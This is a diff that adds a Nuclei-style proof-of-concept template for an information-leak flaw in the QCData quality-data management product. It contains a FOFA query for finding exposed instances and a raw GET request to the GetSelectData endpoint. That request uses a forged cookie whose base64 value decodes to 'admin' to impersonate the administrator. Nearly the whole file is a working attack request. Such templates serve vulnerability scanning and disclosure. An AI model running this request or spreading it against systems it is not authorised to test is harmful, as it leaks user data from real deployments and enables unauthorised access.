@@ -1,0 +1,33 @@
+id: poc-cynyz4gwfvwibvoz
+info:
+  name: QCData 品质数据管理专家GetSelectData存在敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cynyz4gwfvwibvoz'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cynyz4gwfvwibvoz
+    fofa: icon_hash="2029937574" || title="QCData 品质数据管理专家"
+http:
+- raw:
+  - 'GET /BasicData/UserMap/GetSelectData?json HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: QCWeb_lang=zh-CN; QCWeb_User=YWRtaW4=
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
